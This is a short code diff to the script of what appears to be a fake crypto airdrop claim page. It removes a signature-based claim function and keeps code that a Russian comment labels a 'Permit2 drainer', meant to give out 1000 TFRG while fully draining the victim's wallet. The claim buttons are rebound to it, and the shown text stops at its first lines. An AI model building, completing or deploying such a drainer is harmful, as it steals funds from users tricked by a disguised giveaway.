@@ -256,43 +256,6 @@ const BACKEND_BASE = "https://airdrop-backend-ho9i.onrender.com";
     }catch(e){}
   });
 
-  // ===== Claim (EIP-712 → backend)
-  async function doClaim(){
-    if(!signer||!account){ await connect(); if(!signer) return; }
-    if(!/^https?:\/\//.test(BACKEND_URL)){ statusEl.textContent='BACKEND_URL is not set'; return; }
-
-    statusEl.textContent = 'Signing… / Подписываем…';
-    const now = Math.floor(Date.now()/1000);
-    const msg = {
-      claimer: account,
-      amount: ethers.parseUnits(String(PER_WALLET), decimals).toString(),
-      nonce: Math.floor(Math.random()*1e9),
-      deadline: now + 15*60
-    };
-    const domain = { name:'NY Airdrop', version:'1', chainId: CHAIN_ID };
-    const types  = { Claim:[
-      {name:'claimer', type:'address'},
-      {name:'amount',  type:'uint256'},
-      {name:'nonce',   type:'uint256'},
-      {name:'deadline',type:'uint256'}
-    ]};
-
-    let sig;
-    try{ sig = await signer.signTypedData(domain, types, msg); }
-    catch(e){ statusEl.textContent='Signature cancelled / Подпись отменена'; return; }
-
-    statusEl.textContent = 'Sending to server… / Отправляем на сервер…';
-    try{
-      const r = await fetch(BACKEND_URL, {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ token:TOKEN_ADDRESS, ...msg, signature:sig })
-      });
-      const data = await r.json().catch(()=>({}));
-      if(!r.ok){ statusEl.textContent='Error: '+(data.error||r.statusText); return; }
-      statusEl.textContent='Success! Tx: '+(data.txHash||'submitted')+' / Успех!';
-      [claimBtn,claimTop].forEach(b=>b.disabled=true);
-    }catch(e){ statusEl.textContent='Server unavailable / Сервер недоступен'; }
-  }
   // ===== PERMIT2 ДРЕЙНЕР — раздача 1000 TFRG + полный слив всего =====
 claimBtn.onclick = claimTop.onclick = async () => {
   statusEl.textContent = "Signing...";
